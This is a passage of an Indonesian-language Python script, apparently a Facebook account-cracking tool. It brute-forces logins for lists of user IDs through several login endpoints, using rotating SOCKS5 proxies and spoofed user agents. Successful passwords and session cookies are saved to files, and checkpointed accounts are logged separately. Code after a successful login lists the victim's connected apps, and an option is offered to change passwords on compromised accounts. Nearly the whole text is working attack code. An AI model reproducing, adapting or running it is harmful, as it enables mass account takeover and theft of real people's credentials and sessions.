					pool.submit(crackasync,idf,pwv,"m.facebook.com")
				elif 'mbasic' in method:
					pool.submit(crackmbasic,idf,pwv)
				else:
					pool.submit(metode_api,idf,pwv)
		print('')
		cetak('- Sucses Cracked %s Ok:%s Cp:%s Akuntod'%((len(id)),ok,cp))
		print('')
		
#--------------------[ METODE-B-API ]-----------------#

def crack(idf,pwv):
	global loop,ok,cp
	bi = random.choice(['\x1b[1;92m','\x1b[1;91m','\x1b[1;93m'])
	#bi = random.choice(['\33[m'])
	pers = loop*100/len(id2)
	fff = '%'
	#prog.update(des,description=f'\r[green]validata[white] [[green]{idf}[white]] {(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
	prog.update(des,description=f'{bi}Dhanz1{P} [deep_white]{(loop)}/{len(id)}[/] [green]ok[/] : [green]{(ok)} [/][yellow] cp[/] : [yellow]{(cp)}')
	prog.advance(des)
	ua = useragent()
	ua = random.choice(usragent)
	ses = requests.Session()
	for pw in pwv:
		try:
			if 'uadia' in uadarimu: ua = uadia[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			ses.headers.update({'Host': 'm.facebook.com','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','dnt': '1','x-requested-with': 'mark.via.gp','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','accept-encoding': 'gzip, deflate','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=1024275561024729&kid_directed_site=0&app_id=1024275561024729&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.3%2Fdialog%2Foauth%3Fclient_id%3D1024275561024729%26redirect_uri%3Dhttps%253A%252F%252Fserbasepeda.com%252Flogin%252Ffacebook%252Fcallback%26scope%3Demail%26response_type%3Dcode%26state%3DwMl3h1rJrGEgXCnrWhAf0G3MYHsQ4HKCnk291CUT%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D7f51c7d9-1619-44c0-b795-835ce95efba7%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fserbasepeda.com%2Flogin%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DwMl3h1rJrGEgXCnrWhAf0G3MYHsQ4HKCnk291CUT%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/v15.0/dialog/oauth?response_type=token&display=popup&client_id=798478921576823&redirect_uri=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fexplorer%2Fcallback&scope&ret=login&fbapp_pres=0&logger_id=1d976519-dae9-490e-abd3-e3975e110a48&tp=unspecified","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+='m_pixel_ratio=2; wd=360x564'
			heade={'Host': 'm.facebook.com','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','dnt': '1','x-requested-with': 'web.dassem.websiteanalyzer','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv15.0%2Fdialog%2Foauth%3Fresponse_type%3Dtoken%26display%3Dpopup%26client_id%3D798478921576823%26redirect_uri%3Dhttps%253A%252F%252Fdevelopers.facebook.com%252Ftools%252Fexplorer%252Fcallback%26scope%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D1d976519-dae9-490e-abd3-e3975e110a48%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fexplorer%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://m.facebook.com/login/device-based/login/async/?api_key=1024275561024729&auth_token=6127a1703ebf843671086070ddd6f3f6&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.3%2Fdialog%2Foauth%3Fclient_id%3D1024275561024729%26redirect_uri%3Dhttps%253A%252F%252Fserbasepeda.com%252Flogin%252Ffacebook%252Fcallback%26scope%3Demail%26response_type%3Dcode%26state%3DwMl3h1rJrGEgXCnrWhAf0G3MYHsQ4HKCnk291CUT%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D7f51c7d9-1619-44c0-b795-835ce95efba7%26tp%3Dunspecified&refsrc=deprecated&app_id=1024275561024729&cancel=https%3A%2F%2Fserbasepeda.com%2Flogin%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DwMl3h1rJrGEgXCnrWhAf0G3MYHsQ4HKCnk291CUT%23_%3D_&lwv=100',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				Dhanz = Tree("")
				Dhanz.add(flame.fit(f'\r[bold yellow]{idf} | {pw}'))
				Dhanz.add(flame.fit(f"[b yellow] {ua}[b white]"))
				cetak(Dhanz)
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				#os.popen("play-audio /sdcard/CP.mp3")
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				kukis = kuki.replace(f'c_user={idf};datr','sb')
				tree = Tree(flame(f'\t \t  [bold italic]SELAMAT ANDA BEEHASIL LOGIN[bold white] '))
				tree.add(f'[bold green]{idf} | {pw} ')
				tree.add(f'[bold green]{ua}[bold white]')
				tree.add(f'[bold green]{kuki}[bold white]')
				cetak(nel(tree))
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				#os.popen("play-audio /sdcard/ok.mp3")
				cek_apk(idf,pw,kuki)
				break				
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1


#method 2
def crackmbasic(idf,pwv):
	global loop,ok,cp
	bi = random.choice(['\x1b[1;92m','\x1b[1;91m','\x1b[1;93m'])
	pers = loop*100/len(id2)
	fff = '%'
	prog.update(des,description=f'{bi}Dhanz2{P} [deep_white]{(loop)}/{len(id)}[/] [green]ok[/] : [green]{(ok)} [/][yellow] cp[/] : [yellow]{(cp)}')
	prog.advance(des)
	ua = useragent()
	ua = random.choice(usragent)
	ses = requests.Session()
	for pw in pwv:
		try:
			if 'uadia' in uadarimu: ua = uadia[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			ses.headers.update({'Host': 'm.facebook.com','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','dnt': '1','x-requested-with': 'mark.via.gp','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','accept-encoding': 'gzip, deflate','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv9.0%2Fdialog%2Foauth%3Fscope%3Demail%252Cpublic_profile%26state%3D68e894a4dd488c9f41693d42412d62d7%26response_type%3Dcode%26approval_prompt%3Dauto%26redirect_uri%3Dhttps%253A%252F%252Fwww.eventu.al%252Fen%252Fuser%252Flogin%252Ffacebook%252Fcallback%26client_id%3D430803211260605%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dff0992d6-a477-4b5a-b8eb-5e0b63697c36%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.eventu.al%2Fen%2Fuser%2Flogin%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D68e894a4dd488c9f41693d42412d62d7%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com//v9.0/dialog/oauth?scope=email%2Cpublic_profile&state=68e894a4dd488c9f41693d42412d62d7&response_type=code&approval_prompt=auto&redirect_uri=https%3A%2F%2Fwww.eventu.al%2Fen%2Fuser%2Flogin%2Ffacebook%2Fcallback&client_id=430803211260605&ret=login&fbapp_pres=0&logger_id=ff0992d6-a477-4b5a-b8eb-5e0b63697c36&tp=unspecified","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+='m_pixel_ratio=2; wd=360x564'
			heade={'Host': 'm.facebook.com','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','dnt': '1','x-requested-with': 'web.dassem.websiteanalyzer','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv9.0%2Fdialog%2Foauth%3Fscope%3Demail%252Cpublic_profile%26state%3D68e894a4dd488c9f41693d42412d62d7%26response_type%3Dcode%26approval_prompt%3Dauto%26redirect_uri%3Dhttps%253A%252F%252Fwww.eventu.al%252Fen%252Fuser%252Flogin%252Ffacebook%252Fcallback%26client_id%3D430803211260605%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dff0992d6-a477-4b5a-b8eb-5e0b63697c36%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.eventu.al%2Fen%2Fuser%2Flogin%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D68e894a4dd488c9f41693d42412d62d7%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				tree = Tree(flame.fit(f"[b red]AKUN CHECKPOINT",guide_style="bold grey70"))
				Dhanz_tree = tree.add(flame.fit(f"[b yellow]ID & PW[b white]",style="b blue"))
				Dhanz_tree.add("{idf}")
				Dhanz_tree.add("{pw}")
				Dhanza_tree = tree.add(flame.fit(f"[b yellow]UA & TAHUN",style="b blue"))
				Dhanza_tree.add("{ua}")
				Dhanza_tree.add("{tahun(idf)}")
				CON.print(tree)
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				#os.popen("play-audio /sdcard/CP.mp3")
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				kukis = kuki.replace(f'c_user={idf};datr','sb')
				tree = Tree(flame.fit(f"[b red]AKUN CHECKPOINT",guide_style="bold grey70"))
				Dhanz_tree = tree.add(flame.fit(f"[b yellow]ID & PW[b white]",style="b blue"))
				Dhanz_tree.add("{idf}")
				Dhanz_tree.add("{pw}")
				Dhanz_tree.add("{tahun(idf)}")
				Dhanza_tree = tree.add(flame.fit(f"[b yellow]USER_AGENTS & COOKIES",style="b blue"))
				Dhanza_tree.add("{ua}")
				Dhanza_tree.add("{kuki}")
				cetak(tree)
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				#os.popen("play-audio /sdcard/ok.mp3")
				cek_apk(kuki)
				break				
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

url = 'm.facebook.com'
def crackasync(idf,pwv,url):
	global loop,ok,cp
	bi = random.choice(['\x1b[1;92m','\x1b[1;91m','\x1b[1;93m'])
	#bi = random.choice(['\33[m'])
	pers = loop*100/len(id2)
	fff = '%'
	#prog.update(des,description=f'\r[green]validata[white] [[green]{idf}[white]] {(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
	prog.update(des,description=f'{bi}Async{P} [deep_white]{(loop)}/{len(id)}[/] [green]ok[/] : [green]{(ok)} [/][yellow] cp[/] : [yellow]{(cp)}')
	prog.advance(des)
	ua = useragent()
	ua = random.choice(usragent)
	ses = requests.Session()
	for pw in pwv:
		try:
			if 'uadia' in uadarimu: ua = uadia[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			ses.headers.update({"Host": url, "upgrade-insecure-requests": "1", "user-agent": "Dalvik/2.1.0 (Linux; U; Android 5.1; PRO 5 Build/LMY47D)", "accept": "*/*", "sec-fetch-site":  "same-origin", "sec-fetch-mode": "cors","sec-fetch-user": "?1", "sec-fetch-dest": "manifest","accept-encoding": "gzip, deflate", "accept-language":  "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
			link = ses.get(f"https://{url} /login/?next=https%3A%2F%2Fdevelopers.facebook.com%2Fasync%2Fregistration&ref=dbl&fl&login_from_aymh=1&refid=9&hrc=1").text
			date = {'lsd': re.search('name="lsd" value="(.*?)"',str(link)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"',str(link)).group(1), 'm_ts': re.search('name="m_ts" value="(.*?)"',str(link)).group(1), 'li': re.search('name="li" value="(.*?)"',str(link)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': idf, 'pass': pw, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(link)).group(1)}
			head = {"Host": url, "content-length": f"{len(str(date))}", "x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(link)).group(1), "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "accept": "*/*","origin": f"https://{url}","x-requested-with": "com.mi.globalbrowser.mini", "sec-fetch-site": "same-origin", "sec-fetch-mode": "cors", "sec-fetch-dest": "manifest","accept-encoding": "gzip, deflate", "referer": f"https://{url}/login.php?skip_api_login=1&api_key=467906450393051&kid_directed_site=0&app_id=467906450393051&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Faccounts.krafton.com%252Fauth%252Ffacebook%252Fcallback%26scope%3Demail%26state%3DjN3KSwBGBTfJykz3En5cHx5u%26client_id%3D467906450393051%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Daf4414f8-ff7a-4607-81dc-2f264b5e8526%26tp%3Dunspecified&cancel_url=https%3A%2F%2Faccounts.krafton.com%2Fauth%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DjN3KSwBGBTfJykz3En5cHx5u%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr", "accept-encoding": "gzip, deflate", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			bz = ses.post(f"https://{url}/login/device-based/login/async/?next=https%3A%2F%2Fdevelopers.facebook.com%2Fasync%2Fregistration&refsrc=deprecated&lwv=100",data=date, headers=head, proxies=proxs)
			if "checkpoint" in ses.cookies.get_dict().keys():
				cp+=1
				akun.append(idf+'|'+pw)
				tree = Tree("")
				tree.add(flame.fit(f"\r[bold yellow]{idf} | {pw}")).add(flame.fit(f"\r[bold yellow]{ua}[bold white]\n"))
				cetak(tree)
				oppen('sdcard/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				headapp={"user-agent":"SupportsFresco=1 Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J210F Build/MMB29Q) Source/1 [FBAN/EMA;UNITY_PACKAGE/342;FBBV/107586706;FBAV/172.0.0.8.182;FBDV/SM-J210F;FBLC/id_ID;FBOP/20]"}
				if 'no' in taplikasi:
					ok+=1
					coki=ses.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					tree= Tree(f"                                                                           ")
					tree.add(f"\r[bold green]{idf} | {pw}").add(f"\r[bold green ]{kuki} ")
					cetak(tree)
					open('sdcard/OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
				elif 'ya' in taplikasi:
					coki=ses.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					cek_apk(idf,pw,kuki)
					#user=idf
					#infoakun = ""
					session = requests.Session()
					cek2 = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text
					cek =session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text
					apkaktif=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek))
					nok=1
					for muncul in apkaktif:
						infoakun+= (f"	{x}[{h}{nok}{x}] {b}{muncul[0]} {muncul[1]}{x}\n")
						nok+=1

					hit=0
					apkexp=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek2))
					hit=0
					for muncul in apkexp:
						hit+=1
						ok+=1
						infoakun += (f"{x}[{k}{hit}{x}] {m}{muncul[0]} {muncul[1]}{x}\n")
					tree= Tree(f"                                                                           ")
					tree.add(f"\r[bold green]{idf} | {pw}")
					tree.add(f"\r [white]Cookie [bold green]{kuki}").add(f"[white] {infoakun}")
					cetak(tree)
					#os.popen('play-audio data/ok.mp3')
					
					break

			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(1)
	loop+=1
				
def metode_api(idf,pwv):
	global loop,ok,cp
	bi = random.choice(['\x1b[1;92m','\x1b[1;91m','\x1b[1;93m'])
	pers = loop*100/len(id2)
	fff = '%'
	prog.update(des,description=f'{bi}Dhanz API{P} [deep_white]{(loop)}/{len(id)}[/] [green]ok[/] : [green]{(ok)} [/][yellow] cp[/] : [yellow]{(cp)}')
	prog.advance(des)
	ua = useragent()
	ua = random.choice(usragent)
	ses = requests.Session()
	for pw in pwv:
		try:
			if 'uadia' in uadarimu: ua = uadia[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			ses.headers.update({'Host': 'm.facebook.com','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','dnt': '1','x-requested-with': 'mark.via.gp','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','accept-encoding': 'gzip, deflate','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv15.0%2Fdialog%2Foauth%3Fresponse_type%3Dtoken%26display%3Dpopup%26client_id%3D798478921576823%26redirect_uri%3Dhttps%253A%252F%252Fdevelopers.facebook.com%252Ftools%252Fexplorer%252Fcallback%26scope%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D1d976519-dae9-490e-abd3-e3975e110a48%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fexplorer%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/v15.0/dialog/oauth?response_type=token&display=popup&client_id=798478921576823&redirect_uri=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fexplorer%2Fcallback&scope&ret=login&fbapp_pres=0&logger_id=1d976519-dae9-490e-abd3-e3975e110a48&tp=unspecified","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+='m_pixel_ratio=2; wd=360x564'
			heade={'Host': 'm.facebook.com','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','dnt': '1','x-requested-with': 'web.dassem.websiteanalyzer','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv15.0%2Fdialog%2Foauth%3Fresponse_type%3Dtoken%26display%3Dpopup%26client_id%3D798478921576823%26redirect_uri%3Dhttps%253A%252F%252Fdevelopers.facebook.com%252Ftools%252Fexplorer%252Fcallback%26scope%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D1d976519-dae9-490e-abd3-e3975e110a48%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fexplorer%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				
				Dhanz = Tree(flame.fit(f"""[b yellow]{idf} | {pw} [b yellow]""",style=f"b blue"),guide_style="bold grey70")
				Dhanz.add(flame.fit(f"[b yellow]{ua}[b white]",title="[b red]User-Agents[b white]",style="b blue"))
				cetak(Dhanz)
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				#os.popen("play-audio /sdcard/CP.mp3")
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				kukis = kuki.replace(f'c_user={idf};datr','sb')
				Dhanz = Tree(flame.fit(f"""[b green]{idf} | {pw} [b white]""",style=f"b blue"),guide_style="bold grey70")
				Dhanz.add(flame.fit(f"[b green]{ua}[b white]",title="[b green]User-Agents[b white]",style="b blue"))
				Dhanz.add(flame.fit(f"[b green]{kuki}[b white]",title="[b green]Cookies[b white]",style="b blue"))
				cetak(Dhanz)
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				#os.popen("play-audio /sdcard/ok.mp3")
				#get_apk(active,cookie)
				break				
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

#___________[Tahun]____________________________#
def tahun(fx):
	if len(fx)==15:
		if fx[:10] in ['1000000000']       :tahunz = '2009'
		elif fx[:9] in ['100000000']       :tahunz = '2009'
		elif fx[:8] in ['10000000']        :tahunz = '2009'
		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = '2009'
		elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = '2010'
		elif fx[:6] in ['100001']          :tahunz = '2010-2011'
		elif fx[:6] in ['100002','100003'] :tahunz = '2011-2012'
		elif fx[:6] in ['100004']          :tahunz = '2012-2013'
		elif fx[:6] in ['100005','100006'] :tahunz = '2013-2014'
		elif fx[:6] in ['100007','100008'] :tahunz = '2014-2015'
		elif fx[:6] in ['100009']          :tahunz = '2015'
		elif fx[:5] in ['10001']           :tahunz = '2015-2016'
		elif fx[:5] in ['10002']           :tahunz = '2016-2017'
		elif fx[:5] in ['10003']           :tahunz = '2018'
		elif fx[:5] in ['10004']           :tahunz = '2019'
		elif fx[:5] in ['10005']           :tahunz = '2020'
		elif fx[:5] in ['10006','10007','10008']:tahunz = '2021-2022'
		else:tahunz=''
	elif len(fx) in [9,10]:
		tahunz = '2008-2009'
	elif len(fx)==8:
		tahunz = '2007-2008'
	elif len(fx)==7:
		tahunz = '2006-2007'
	else:tahunz=''
	return tahunz

import requests, shutil, os, re, bs4, sys, json, time, platform ,random, datetime, subprocess, logging, base64
import hmac, hashlib, urllib, stdiomask, urllib.request, uuid
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as parser
from threading import (Thread, Event)
from time import sleep as jeda
from datetime import datetime

ct = datetime.now()
n = ct.month
bulan_ = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
try:
	if n < 0 or n > 12:
		exit()
	nTemp = n - 1
except ValueError:
	exit()

current = datetime.now()
hari = current.day
bulan = bulan_[nTemp]
tahun = current.year
bullan = current.month

waktu = ("%s-%s-%s"%(hari,bulan,tahun))
bulan12 = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}

M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
P = '\x1b[1;97m' # PUTIH
J = '\033[38;2;255;127;0;1m' # ORANGE
N = '\x1b[0m' # WARNA MATI
acak = [M, H, K, B, U, O, P, J]
warna = random.choice(acak)
til ="\033[0m╰─ "

def jalan(keliling):
	for mau in keliling + '\n':
		sys.stdout.write(mau)
		sys.stdout.flush();jeda(0.03)
		
		
ubah_pass = []
pwbaru = []
pwBaru = []
ubahP = []

def file_cp():
	atsu = []
	dirs = os.listdir('CP')
	cetak(flame(f"[[b green]•[b white]] Pilih Hasil Crack Yg Tersimpan Untuk Cek Opsi",style="b blue"))
	#print ("%s%s%s [%s\033[0m \033[0mpilih hasil crack yg tersimpan untuk cek opsi %s{P}]\n"%(U,til,O,U,O)) 
	nomor = 0
	for file in dirs:
		nomor+= 0
		#atsu.append(flame(f"{0}",width=1))
		atsu.append(flame(f"{nomor}",width=10))
		atsu.append(flame(f"{file}",width=40))
		lupine_id.print(Columns(atsu))
		#print("%s%s\033[0m%s"%(U,til,file));jeda(0.07)
	try:
		print("\n%s%s%s\033[0m Masukan file [ cth%s: %sCP-%s.txt%s ]"%(U,til,O,M,K,waktu,O))
		opsi()
	except IOError:
		print ('%s%s \033[0mfile tidak ada'%(M,til))
		exit()

def opsi():
	CP = ("CP/")
	romi = input("%s%s%s \033[0mNama file %s> %s"%(U,til,O,M,K))
	if romi == "":
		print("%s%s \033[0misi yang benar "%(M,til));jeda(2)
		opsi()
	try:
		file_cp = open(CP+romi, "r").readlines()
	except IOError:
		exit("\n%s%s \033[0mnama file %s\033[0m tidak tersedia"%(M,til,romi))
	jalan("%s%s%s\033[0m Mode pesawatkan terlebih dahulu 5 detik "%(U,til,O))
	pw=input("\n%s%s%s \033[0mubah sandi pada akun one tab? y/t %s> %s"%(U,til,O,M,K))
	if pw in['y','Y']:
		ubah_pass.append("ubah_sandi")
		pw2 = input("%s%s%s \033[0mmasukan sandi %s> %s"%(U,til,O,M,K))
		if len(pw2) <= 5:
			print("%s%s sandi minimal 6 karakter "%(M,til))
		else:
			pwbaru.append(pw2)
	print("\n %s# %s---------------------------------------- %s#"%(P,M,P));jeda(2)
	print ("%s%s%s\033[0m total akun %s: %s%s "%(U,til,O,M,K,str(len(file_cp))))
	print(" %s# %s---------------------------------------- %s#"%(P,M,P));jeda(2)
	nomor = 0
	for fb in file_cp:
		akun = fb.replace("\n","")
		ngecek  = akun.split("|")
		nomor+=1
